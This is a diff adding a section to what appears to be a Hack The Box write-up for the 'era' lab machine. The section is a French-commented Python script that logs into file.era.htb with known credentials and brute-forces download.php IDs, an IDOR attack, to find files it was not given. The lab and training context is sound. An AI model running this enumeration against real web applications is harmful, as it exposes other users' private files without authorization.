@@ -713,3 +713,50 @@ reset: unknown terminal type unknown
 Terminal type? screen
 app@artificial:~$
 ```
+
+***
+
+## PYTHON SCRIPT TO IDOR EXPLOIT
+
+{% code fullWidth="true" %}
+```python
+import requests
+from bs4 import BeautifulSoup  # nécessaire pour parsing HTML
+
+# Crée une session persistante
+curSession = requests.Session()
+
+# Tes identifiants de connexion
+payload = {
+    'submitted': 'true',
+    'username': 'niko',
+    'password': 'niko'
+}
+
+# Envoie la requête POST pour se connecter
+login_url = "http://file.era.htb/login.php"
+response = curSession.post(login_url, data=payload)
+
+# Affiche la réponse pour voir si on est connecté
+print("[+] Login response code:", response.status_code)
+print("[+] Cookies reçus:", curSession.cookies.get_dict())
+
+# Essaye d'accéder à une ressource protégée
+for i in range(10000):
+    download_url = f'http://file.era.htb/download.php?id={i}'
+    r = curSession.get(download_url)
+
+    if 'File Not Found' not in r.text:
+        print(f'[+] Fichier trouvé à l’ID {i} !')
+        
+
+        # Parse le nom du fichier avec BeautifulSoup si besoin
+        soup = BeautifulSoup(r.text, 'html.parser')
+        content_div = soup.find('div', class_='main-content')
+        if content_div:
+            file_name = content_div.text.strip()
+            print("[+] Nom du fichier :", file_name)
+        else:
+            print("[-] Div .main-content non trouvée")
+```
+{% endcode %}
